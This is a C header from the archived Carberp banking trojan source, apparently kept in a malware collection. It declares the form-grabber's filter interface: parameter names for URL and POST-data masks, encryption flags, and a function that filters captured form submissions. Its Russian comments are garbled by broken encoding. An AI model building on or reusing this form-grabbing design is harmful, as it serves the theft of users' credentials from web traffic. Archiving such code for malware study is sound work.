/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

//---------------------------------------------------------------------------
//  ������ ���������� ������ �����������
//  
//	�����: ������ ����� ��������� � ������� ������ ���� ��� ����� �������
//         � ������ Modules.h
//---------------------------------------------------------------------------

#ifndef FgrFiltersH
#define FgrFiltersH
//---------------------------------------------------------------------------

#include <windows.h>



#define FGRFILTER_PARAM_SIZE_URLS     3000
#define FGRFILTER_PARAM_SIZE_DATAMASK 3000

#define FGRFILTER_PARAM_NAME_URLS       "FGR_URL_FILTERS\0"
#define FGRFILTER_PARAM_NAME_DATAMASK   "FGR_PARAMS_FILTERS\0"

#ifndef DEBUGCONFIG
	#define FGRFILTER_PARAM_ENCRYPTED_URLS     true
	#define FGRFILTER_PARAM_ENCRYPTED_DATAMASK true
#else
	#define FGRFILTER_PARAM_ENCRYPTED_URLS     false
	#define FGRFILTER_PARAM_ENCRYPTED_DATAMASK false
#endif


//-------------------------------------------------
//  ������� ��������� ���� ������ � � ������
//  ������������� �������� �� �� ������ ����������
//  ������
//-------------------------------------------------
bool FiltratePostData(const char* URL, const char* Data);


//-------------------------------------------------
//  FiltrateFormGrabberURL - ������� ����������
//  	������ ���� ������ ��������������
//		������������
//-------------------------------------------------
//bool FiltrateFormGrabberURL(PCHAR URL);


//-------------------------------------------------
//  FiltrateFormGrabberData - ������� ����������
//  	������ ���� ������ ������ ����������
//-------------------------------------------------
//bool FiltrateFormGrabberData(const char* Data);


//---------------------------------------------------------------------------
#endif
